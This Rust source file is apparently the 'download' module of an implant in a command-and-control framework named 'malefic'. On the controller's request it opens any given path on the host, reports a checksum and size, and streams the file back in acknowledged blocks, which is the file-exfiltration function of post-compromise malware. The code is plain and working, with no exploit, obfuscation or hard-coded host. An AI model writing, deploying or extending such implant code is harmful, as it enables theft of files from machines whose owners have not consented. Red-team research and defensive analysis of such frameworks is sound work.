use malefic_helper::common::filesys::check_sum;
use malefic_proto::proto::modulepb::{Block, DownloadResponse};
use std::fs::{metadata, OpenOptions};
use std::io::Read;
use futures::SinkExt;
use crate::prelude::*;

pub struct Download {}

#[async_trait]
#[module_impl("download")]
impl Module for Download {}

#[async_trait]
impl ModuleImpl for Download {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_proto::module::Input,
        sender: &mut malefic_proto::module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::DownloadRequest)?;
        let path: String = check_field!(request.path)?;
        let path_clone = path.clone();
        let mut file = OpenOptions::new().read(true).open(path_clone)?;

        let sum = check_sum(&path)?;
        let metadata = metadata(&path)?;
        let size = metadata.len();
        debug!("checksum: {}, size: {}", sum, size);
        let _ = sender
            .send(TaskResult::new_with_body(
                id,
                Body::DownloadResponse(DownloadResponse {
                    checksum: (sum),
                    size: (size),
                }),
            ))
            .await?;

        let buffer_size = request.buffer_size as usize;
        let mut buffer = vec![0; buffer_size];
        let mut seq = 0;
        loop {
            let ack = check_request!(receiver, Body::Ack)?;
            if !ack.success {
                return to_error!(Err("download server ack failed".to_string()));
            }
            let n = file.read(&mut buffer)?;
            let block = Block {
                block_id: seq,
                content: buffer[..n].to_vec(),
                end: n < buffer_size, // 如果读取的字节少于缓冲区大小，则这是最后一个块
            };
            debug!("block_id: {}, size {}", block.block_id, n);
            if block.end {
                return Ok(TaskResult::new_with_body(id, Body::Block(block)));
            } else{
                let _ = sender.send(TaskResult::new_with_body(id, Body::Block(block))).await?;
                seq += 1;
            }
        }
    }
}